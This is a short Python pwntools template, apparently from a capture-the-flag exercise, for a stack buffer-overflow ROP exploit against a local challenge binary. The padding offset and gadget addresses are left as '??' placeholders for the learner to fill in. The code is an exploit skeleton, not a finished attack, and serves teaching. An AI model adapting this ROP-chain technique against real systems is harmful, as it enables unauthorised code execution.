from pwn import *
elf = context.binary = ELF("./chal")
p = elf.process()

# Dump ropgadgets using the command 
# ROPgadgets --binary=./chal

ret = ??
rdi = ??
rsi = ??

offset = ??

payload = b"a"*offset + p64(??) + p64(0xdeadbeef) + p64(??) + p64(??) + p64(0x0) + p64(??)
p.sendline(payload)

p.interactive()